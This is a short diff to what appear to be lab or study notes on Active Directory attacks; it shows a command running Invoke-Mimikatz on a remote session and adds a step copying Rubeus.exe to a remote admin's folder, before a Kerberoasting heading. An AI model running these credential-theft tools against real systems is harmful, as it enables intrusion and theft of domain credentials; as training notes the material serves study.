@@ -231,7 +231,10 @@ coming ...
 ```
 Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
 ```
-
+upload script:
+```
+Copy-Item -ToSession $appsrv1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\appadmin\Downloads
+```
 # Kerberoasting - ASK TGS
 
 find:
